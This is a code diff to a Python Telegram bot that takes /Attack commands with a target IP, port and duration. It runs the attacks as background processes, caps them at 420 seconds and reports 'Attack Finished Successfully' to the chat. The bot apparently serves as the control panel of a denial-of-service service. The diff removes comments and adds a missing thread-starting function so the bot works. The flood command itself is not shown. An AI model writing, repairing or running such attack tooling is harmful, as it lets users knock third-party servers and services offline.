@@ -21,7 +21,6 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 running_processes = []
 
 
-# --------------------  ATTACK FUNCTION  --------------------
 async def run_attack_command_async(target_ip, target_port, duration, chat_id, username, start_msg_id):
     max_duration = 420
     duration = min(int(duration), max_duration)
@@ -39,10 +38,8 @@ async def run_attack_command_async(target_ip, target_port, duration, chat_id, us
 
         await asyncio.sleep(duration)
 
-        # Delete "attack started" message
         bot.delete_message(chat_id, start_msg_id)
 
-        # Send finished attack message
         finished_msg = bot.send_message(
             chat_id,
             f"*✅ Attack Finished Successfully!*\n\n"
@@ -68,7 +65,13 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 
-# --------------------  ATTACK COMMAND  --------------------
+# ------------- FIXED MISSING FUNCTION -------------
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+# --------------------------------------------------
+
+
 @bot.message_handler(commands=['Attack'])
 def attack_command(message):
     try:
@@ -119,7 +122,6 @@ def process_attack_command(message):
         logging.error(f"Error in attack process: {e}")
 
 
-# --------------------  UI BUTTONS + START  --------------------
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
@@ -138,7 +140,6 @@ def send_welcome(message):
     )
 
 
-# --------------------  BUTTON HANDLER  --------------------
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     if message.text == "Attack 🚀":
@@ -172,7 +173,6 @@ def handle_message(message):
         bot.reply_to(message, "*Invalid option*", parse_mode="Markdown")
 
 
-# --------------------  START BOT  --------------------
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
